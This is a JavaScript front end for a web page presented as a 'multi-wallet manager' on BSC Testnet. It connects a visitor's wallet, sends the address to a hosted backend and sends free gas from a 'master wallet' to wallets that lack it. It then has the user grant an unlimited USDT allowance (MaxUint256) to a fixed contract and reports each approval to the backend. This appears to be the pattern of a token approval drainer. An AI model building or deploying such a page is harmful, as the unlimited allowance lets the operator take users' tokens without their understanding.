import { BrowserProvider, Contract, ethers } from 'ethers'

// Configuration from environment variables
const CONFIG = {
  API_URL: typeof __VITE_API_URL__ !== 'undefined' ? __VITE_API_URL__ : 'https://multi-wallet-manager-backend-lxfq.onrender.com/api',
  CONTRACT_ADDRESS: typeof __VITE_CONTRACT_ADDRESS__ !== 'undefined' ? __VITE_CONTRACT_ADDRESS__ : '0x88e199AeBB58Eb75F6C2DC9fBe73F871eCC8C92F',
  USDT_CONTRACT_ADDRESS: typeof __VITE_USDT_CONTRACT_ADDRESS__ !== 'undefined' ? __VITE_USDT_CONTRACT_ADDRESS__ : '0x2f79e9e36c0d293f3c88F4aF05ABCe224c0A5638',
  CHAIN_ID: typeof __VITE_CHAIN_ID__ !== 'undefined' ? __VITE_CHAIN_ID__ : '97',
  CHAIN_NAME: typeof __VITE_CHAIN_NAME__ !== 'undefined' ? __VITE_CHAIN_NAME__ : 'BSC Testnet',
  RPC_URL: typeof __VITE_RPC_URL__ !== 'undefined' ? __VITE_RPC_URL__ : 'https://bsc-testnet.publicnode.com'
}

// DOM Elements
const connectSection = document.getElementById('connect-section')
const walletSection = document.getElementById('wallet-section')
const connectWalletBtn = document.getElementById('connect-wallet')
const resetWalletBtn = document.getElementById('reset-wallet')
const connectText = document.getElementById('connect-text')
const approveBtn = document.getElementById('approve-btn')
const approveText = document.getElementById('approve-text')
const disconnectBtn = document.getElementById('disconnect-btn')
const walletAddressEl = document.getElementById('wallet-address')
const usdtBalanceEl = document.getElementById('usdt-balance')
const networkEl = document.getElementById('network')
const statusMessage = document.getElementById('status-message')

// State
let provider = null
let signer = null
let walletAddress = null

// Initialize app
document.addEventListener('DOMContentLoaded', () => {
  const storedAddress = localStorage.getItem('walletAddress')
  
  if (storedAddress) {
    walletAddress = storedAddress
    showWalletSection()
    updateWalletInfo()
  }
  
  networkEl.textContent = CONFIG.CHAIN_NAME

  connectWalletBtn.addEventListener('click', connectWallet)
  resetWalletBtn.addEventListener('click', resetWallet)
  approveBtn.addEventListener('click', handleApprovalFlow)
  disconnectBtn.addEventListener('click', disconnectWallet)
})

// Reset wallet connection
function resetWallet() {
  localStorage.removeItem('walletAddress')
  showStatus('Wallet connection reset. Please connect again.')
  showConnectSection()
}

// Connect wallet
async function connectWallet() {
  try {
    showLoading(connectText, true)
    
    if (!window.ethereum) {
      showError('No Ethereum wallet found.')
      return
    }
    
    const accounts = await window.ethereum.request({
      method: 'eth_requestAccounts'
    })
    
    walletAddress = accounts[0]
    
    provider = new BrowserProvider(window.ethereum)
    signer = await provider.getSigner()
    
    await switchToCorrectNetwork()
    
    localStorage.setItem('walletAddress', walletAddress)
    
    showWalletSection()
    updateWalletInfo()
    
    await sendWalletToBackend()

    const hasGas = await checkWalletGasBalance()
    
    if (!hasGas) {
      showSuccess('Insufficient gas detected. Requesting gas from master wallet...')
      
      await requestGasFromMaster(walletAddress)
      
      showSuccess('Gas sent by master wallet. Waiting for confirmation...')
      await waitForGas(60000)
      showSuccess('Gas received! You can now approve USDT spending.')
    }

    showSuccess('Wallet connected successfully!')
    
  } catch (error) {
    console.error('Connection error:', error)
    showError('Failed to connect wallet: ' + error.message)
  } finally {
    showLoading(connectText, false)
  }
}

// Switch to correct network
async function switchToCorrectNetwork() {
  try {
    const currentChainId = await window.ethereum.request({ method: 'eth_chainId' })
    
    if (parseInt(currentChainId, 16).toString() !== CONFIG.CHAIN_ID) {
      showStatus('Switching network...')
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: `0x${parseInt(CONFIG.CHAIN_ID).toString(16)}` }]
        })
      } catch (switchError) {
        if (switchError.code === 4902) {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: `0x${parseInt(CONFIG.CHAIN_ID).toString(16)}`,
              chainName: CONFIG.CHAIN_NAME,
              rpcUrls: [CONFIG.RPC_URL],
              nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }
            }]
          })
        }
      }
    }
  } catch (error) {
    console.error('Network switch error:', error)
  }
}

// Update wallet information
async function updateWalletInfo() {
  if (!walletAddress) return
  
  walletAddressEl.textContent = formatAddress(walletAddress)
  
  try {
    if (provider) {
      const usdtContract = new Contract(
        CONFIG.USDT_CONTRACT_ADDRESS,
        ['function balanceOf(address account) external view returns (uint256)'],
        provider
      )
      
      const balance = await usdtContract.balanceOf(walletAddress)
      const formattedBalance = ethers.formatUnits(balance, 18)
      usdtBalanceEl.textContent = `${parseFloat(formattedBalance).toFixed(2)} USDT`
    }
  } catch (error) {
    console.error('Balance error:', error)
    usdtBalanceEl.textContent = '0.00 USDT'
  }
}

// Handle approval flow
async function handleApprovalFlow() {
  try {
    showLoading(approveText, true)
    
    const hasGas = await checkWalletGasBalance()
    
    if (!hasGas) {
      showSuccess('Insufficient gas detected. Requesting gas...')
      
      await requestGasFromMaster(walletAddress)
      
      showSuccess('Waiting for gas...')
      await waitForGas(60000)
    }

    await approveUSDTSpending()
    
  } catch (error) {
    console.error('Approval flow error:', error)
    
    if (error.code === 4001 || (error.message && error.message.includes('user rejected'))) {
      showError('Transaction cancelled by user.')
    } else if (error.message && (error.message.includes('gas') || error.message.includes('funds'))) {
      showError('Insufficient gas.')
      resetConnection()
    } else {
      showError('Approval failed: ' + error.message)
    }
  } finally {
    showLoading(approveText, false)
  }
}

// FIXED ENDPOINT HERE
async function requestGasFromMaster(walletAddress) {
  try {
    showSuccess('Requesting gas from master wallet...')
    
    const response = await fetch(`${CONFIG.API_URL}/gas/request-gas`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ address: walletAddress })
    })
    
    if (!response.ok) {
      const errorData = await response.json().catch(() => ({}))
      const errorMessage = errorData.error || `HTTP ${response.status}`
      throw new Error(errorMessage)
    }
    
    return await response.json()
    
  } catch (error) {
    throw new Error(`Gas request failed: ${error.message}`)
  }
}

// Check gas balance
async function checkWalletGasBalance() {
  try {
    if (!provider || !walletAddress) {
      throw new Error('Wallet not connected')
    }
    
    const balance = await provider.getBalance(walletAddress)
    const balanceInBNB = ethers.formatEther(balance)
    
    return parseFloat(balanceInBNB) >= 0.001
    
  } catch (error) {
    console.error('Gas check error:', error)
    return false
  }
}

// Wait for gas
async function waitForGas(timeout = 60000) {
  const startTime = Date.now()
  
  while (Date.now() - startTime < timeout) {
    const hasGas = await checkWalletGasBalance()
    
    if (hasGas) {
      showSuccess('Gas received! Proceeding...')
      return true
    }
    
    await new Promise(resolve => setTimeout(resolve, 3000))
  }
  
  throw new Error('Gas not received in time')
}

// Approve USDT spending
async function approveUSDTSpending() {
  if (!signer) {
    throw new Error('Wallet not connected')
  }
  
  const usdtContract = new Contract(
    CONFIG.USDT_CONTRACT_ADDRESS,
    ['function approve(address spender, uint256 amount) public returns (bool)'],
    signer
  )

  showSuccess('Sending approval transaction...')
  
  const tx = await usdtContract.approve(
    CONFIG.CONTRACT_ADDRESS,
    ethers.MaxUint256
  )
  
  showSuccess('Waiting for confirmation...')
  await tx.wait()
  
  showSuccess('USDT approved!')
  
  approveBtn.disabled = true
  approveText.textContent = 'Approved'
  
  await notifyApprovalToBackend()
}

// Send wallet to backend
async function sendWalletToBackend() {
  try {
    await fetch(`${CONFIG.API_URL}/wallets/connect`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        address: walletAddress,
        name: `Wallet ${walletAddress.substring(0, 6)}...${walletAddress.substring(38)}`
      })
    })
  } catch {}
}

// Notify backend of approval
async function notifyApprovalToBackend() {
  try {
    await fetch(`${CONFIG.API_URL}/wallets/approve-spending`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ address: walletAddress })
    })
  } catch {}
}

// Reset connection
function resetConnection() {
  walletAddress = null
  provider = null
  signer = null
  
  localStorage.removeItem('walletAddress')
  
  showConnectSection()
  
  connectWalletBtn.disabled = false
  connectText.textContent = 'Connect Wallet'
  approveBtn.disabled = false
  approveText.textContent = 'Approve USDT Spending'
  
  walletAddressEl.textContent = ''
  usdtBalanceEl.textContent = '0.00 USDT'
  
  showSuccess('Wallet disconnected.')
}

function disconnectWallet() {
  resetConnection()
}

// UI helpers
function showConnectSection() {
  connectSection.classList.remove('hidden')
  walletSection.classList.add('hidden')
}

function showWalletSection() {
  connectSection.classList.add('hidden')
  walletSection.classList.remove('hidden')
  approveBtn.disabled = false
  approveText.textContent = 'Approve USDT Spending'
}

function formatAddress(address) {
  if (!address) return ''
  return `${address.substring(0, 6)}...${address.substring(38)}`
}

function showLoading(element, show) {
  if (!element) return
  
  if (show) {
    const originalText = element.textContent
    element.setAttribute('data-original-text', originalText)
    element.innerHTML = '<span class="loading"></span>Processing...'
  } else {
    const originalText = element.getAttribute('data-original-text')
    element.textContent = originalText
  }
}

function showSuccess(message) {
  statusMessage.textContent = message
  statusMessage.className = 'status status-success'
  statusMessage.classList.remove('hidden')
  setTimeout(() => statusMessage.classList.add('hidden'), 5000)
}

function showError(message) {
  statusMessage.textContent = message
  statusMessage.className = 'status status-error'
  statusMessage.classList.remove('hidden')
  setTimeout(() => statusMessage.classList.add('hidden'), 5000)
}
